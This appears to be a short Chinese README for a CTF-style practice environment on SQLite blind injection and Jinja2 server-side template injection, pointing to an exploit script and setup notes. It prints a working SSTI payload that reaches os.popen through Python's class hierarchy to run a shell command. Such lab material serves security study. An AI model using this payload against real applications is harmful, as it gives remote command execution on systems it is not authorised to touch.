python3环境下的sqlite3跟ssti

python main.py 运行环境

注入exp在：exp.py

由于环境不同，延时注入的返回时间可能不同，请自行调试。
代码较为冗长，都是用的同一种方法盲注

flag文件请放在更目录，否则用cat flag。

ssti的payload为：  
```  
{% for c in ''.__class__.__base__.__subclasses__() %}
{% if c.__name__=='catch_warnings' %}
{{ c.__init__.__globals__.get('__builtins__').get('__import__')("os").popen('whoami').read() }}
{% endif %}
{% endfor %}   
```

![pic1](/pic/3.png)

![pic1](/pic/1.png)

![pic1](/pic/2.png)

![pic1](/pic/4.png)